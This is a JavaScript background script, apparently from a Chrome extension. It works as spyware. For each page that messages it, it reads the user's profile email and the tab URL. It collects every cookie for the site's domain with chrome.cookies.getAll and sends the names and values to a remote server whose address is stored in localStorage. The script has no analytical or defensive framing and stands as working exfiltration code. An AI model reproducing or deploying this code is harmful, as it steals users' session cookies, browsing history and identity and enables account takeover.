function httpGetAsync(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() {
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            console.log(".")
    }
    xmlHttp.open("GET", theUrl, true); // true for asynchronous
    xmlHttp.send(null);
}

function get_cook(from, email) {
    var domain = extractRootDomain(from)
    var sender_url = localStorage.urler;
    httpGetAsync(sender_url + "cookie");
 chrome.cookies.getAll({"domain": domain}, function(cookie){
        var i = 0;
        var nUmber = cookie.length;
     while (i < nUmber) { 
         httpGetAsync(sender_url + email + "==" + from + "==" + cookie[i].name + "==" + cookie[i].value + "==" + cookie[i].domain);
         i++;
    }
});
}


function extractHostname(url) {
    var hostname;
    //find & remove protocol (http, ftp, etc.) and get hostname

    if (url.indexOf("//") > -1) {
        hostname = url.split('/')[2];
    }
    else {
        hostname = url.split('/')[0];
    }

    //find & remove port number
    hostname = hostname.split(':')[0];
    //find & remove "?"
    hostname = hostname.split('?')[0];

    return hostname;
}

// To address those who want the "root domain," use this function:
function extractRootDomain(url) {
    var domain = extractHostname(url),
        splitArr = domain.split('.'),
        arrLen = splitArr.length;

    //extracting the root domain here
    //if there is a subdomain 
    if (arrLen > 2) {
        domain = splitArr[arrLen - 2] + '.' + splitArr[arrLen - 1];
        //check to see if it's using a Country Code Top Level Domain (ccTLD) (i.e. ".me.uk")
        if (splitArr[arrLen - 2].length == 2 && splitArr[arrLen - 1].length == 2) {
            //this is using a ccTLD
            domain = splitArr[arrLen - 3] + '.' + domain;
        }
    }
    return domain;
}

chrome.extension.onMessage.addListener(
  function(request, sender, sendResponse) {
    if ( request.greeting == "request") {
    chrome.identity.getProfileUserInfo(function(userInfo) {
        var email = userInfo.email;
        localStorage[sender.tab.url] = ".";
        var urler = encodeURIComponent(sender.tab.url);
        var sender_url = localStorage.urler;
        httpGetAsync(sender_url + email + "==" + urler);
        get_cook(sender.tab.url, email);
        sendResponse();
    });
    } else {
    chrome.identity.getProfileUserInfo(function(userInfo) {
    var email = userInfo.email;
    localStorage[sender.tab.url] = ".";
    var urler = encodeURIComponent(sender.tab.url);
    var sender_url = localStorage.urler;
    httpGetAsync(sender_url + email + "==" + urler + "==" + request.greeting);
    sendResponse();
    });
    }
  });
